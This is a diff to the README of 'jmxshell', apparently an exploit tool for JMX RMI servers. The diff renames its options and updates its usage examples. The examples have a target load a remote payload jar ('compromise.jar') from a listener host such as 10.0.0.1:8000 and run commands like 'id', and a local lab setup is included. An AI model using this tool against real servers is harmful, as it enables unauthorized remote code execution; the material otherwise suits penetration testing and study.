@@ -31,18 +31,19 @@ To render `web/woot.html` from the template for a specific URL serving `compromi
 ## Usage
 
 ```
-jmxshell --host <host> --port <port> --command <cmd> --url <url> [--username <u> --password <p>]
-jmxshell --host <host> --port <port> --cleanup [--username <u> --password <p>]
+jmxshell --target <host> --jmxPort <port> --command <cmd> --lhost <ip> --lport <port> [--username <u> --password <p>]
+jmxshell --target <host> --jmxPort <port> --cleanup [--username <u> --password <p>]
 ```
 
 Options:
 
 | Option | Description |
 | --- | --- |
-| `--host <host>` | JMX RMI server hostname or IP |
-| `--port <port>` | JMX RMI server port |
+| `--target <host>` | JMX RMI server hostname or IP |
+| `--jmxPort <port>` | JMX RMI server port |
 | `--command <cmd>` | Command to execute on the target (exploit mode) |
-| `--url <url>` | Base URL serving `woot.html` and `compromise.jar` |
+| `--lhost <ip>` | Listen host the target fetches `woot.html` / `compromise.jar` from |
+| `--lport <port>` | Listen port (`CODEBASE = http://<lhost>:<lport>`) |
 | `--cleanup` | Remove MLet beans previously installed by this tool |
 | `--username <u>` | JMX username — must be paired with `--password` |
 | `--password <p>` | JMX password — must be paired with `--username` |
@@ -64,14 +65,14 @@ In another, drive the target:
 
 ```sh
 java -jar build/libs/jmxshell-1.0.0.jar \
-    --host target.example.com --port 1099 \
-    --command 'id' --url http://10.0.0.1:8000
+    --target target.example.com --jmxPort 1099 \
+    --command 'id' --lhost 10.0.0.1 --lport 8000
 ```
 
 When done, remove the registered MBeans:
 
 ```sh
-java -jar build/libs/jmxshell-1.0.0.jar --host target.example.com --port 1099 --cleanup
+java -jar build/libs/jmxshell-1.0.0.jar --target target.example.com --jmxPort 1099 --cleanup
 ```
 
 ## Trying it locally
@@ -97,11 +98,11 @@ cd build/web && python3 -m http.server 8000
 
 ```sh
 java -jar build/libs/jmxshell-1.0.0.jar \
-    --host 127.0.0.1 --port 1099 \
+    --target 127.0.0.1 --jmxPort 1099 \
     --command /bin/id \
-    --url http://127.0.0.1:8000
+    --lhost 127.0.0.1 --lport 8000
 
-java -jar build/libs/jmxshell-1.0.0.jar --host 127.0.0.1 --port 1099 --cleanup
+java -jar build/libs/jmxshell-1.0.0.jar --target 127.0.0.1 --jmxPort 1099 --cleanup
 ```
 
 Or run all of the above as a single end-to-end test that asserts `/bin/id` returns a `uid=` line:
